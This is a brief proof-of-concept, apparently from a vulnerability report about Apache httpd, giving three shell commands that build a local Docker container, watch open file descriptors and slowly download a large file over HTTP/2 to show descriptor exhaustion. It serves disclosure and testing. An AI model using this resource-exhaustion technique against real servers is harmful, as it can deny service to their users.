### PoC

1. Build and run Docker container:

```
docker build --tag poc . && docker run --ulimit nofile=65535:65535 -p 8080:80 poc
```

2. Watch number of fds across httpd processes:

```
while true; do ( for X in $(pidof httpd apache2); do ls /proc/$X/fd; done ) | wc -l; sleep 1; done
```

3. Run curl to download slowly big file:

```
curl --http2-prior-knowledge --limit-rate=10M http://localhost:8080/big >/dev/null
```
